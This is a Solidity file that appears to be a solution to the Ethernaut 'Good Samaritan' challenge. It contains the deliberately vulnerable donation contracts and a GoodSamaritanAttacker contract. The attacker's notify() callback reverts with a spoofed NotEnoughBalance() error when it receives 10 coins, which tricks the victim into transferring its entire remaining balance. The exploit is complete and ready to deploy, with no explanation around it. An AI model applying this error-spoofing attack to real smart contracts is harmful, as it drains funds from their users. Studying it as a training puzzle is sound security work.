// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract GoodSamaritan {
  GoodSamaritanWallet public wallet;
  GoodSamaritanCoin public coin;

  constructor() {
    wallet = new GoodSamaritanWallet();
    coin = new GoodSamaritanCoin(address(wallet));

    wallet.setCoin(coin);
  }

  function requestDonation() external returns (bool enoughBalance) {
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) {
      return true;
    } catch (bytes memory err) {
      if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
        // send the coins left
        wallet.transferRemainder(msg.sender);
        return false;
      }
    }
  }
}

contract GoodSamaritanCoin {
  using Address for address;

  mapping(address => uint256) public balances;

  error InsufficientBalance(uint256 current, uint256 required);

  constructor(address wallet_) {
    // one million coins for Good Samaritan initially
    balances[wallet_] = 10 ** 6;
  }

  function transfer(address dest_, uint256 amount_) external {
    uint256 currentBalance = balances[msg.sender];

    // transfer only occurs if balance is enough
    if (amount_ <= currentBalance) {
      balances[msg.sender] -= amount_;
      balances[dest_] += amount_;

      if (dest_.isContract()) {
        // notify contract
        INotifyable(dest_).notify(amount_);
      }
    } else {
      revert InsufficientBalance(currentBalance, amount_);
    }
  }
}

contract GoodSamaritanWallet {
  // The owner of the wallet instance
  address public owner;

  GoodSamaritanCoin public coin;

  error OnlyOwner();
  error NotEnoughBalance();

  modifier onlyOwner() {
    if (msg.sender != owner) {
      revert OnlyOwner();
    }
    _;
  }

  constructor() {
    owner = msg.sender;
  }

  function donate10(address dest_) external onlyOwner {
    // check balance left
    if (coin.balances(address(this)) < 10) {
      revert NotEnoughBalance();
    } else {
      // donate 10 coins
      coin.transfer(dest_, 10);
    }
  }

  function transferRemainder(address dest_) external onlyOwner {
    // transfer balance left
    coin.transfer(dest_, coin.balances(address(this)));
  }

  function setCoin(GoodSamaritanCoin coin_) external onlyOwner {
    coin = coin_;
  }
}

interface INotifyable {
  function notify(uint256 amount) external;
}

contract GoodSamaritanAttacker is INotifyable {
  // error signature will be taken from here
  error NotEnoughBalance();

  // entry point for our attack, simply requests a donation
  function pwn(address _addr) external {
    GoodSamaritan(_addr).requestDonation();
  }

  // notify is called when this contract receives coins
  function notify(uint256 amount) external pure override {
    // only revert on 10 coins
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }
}
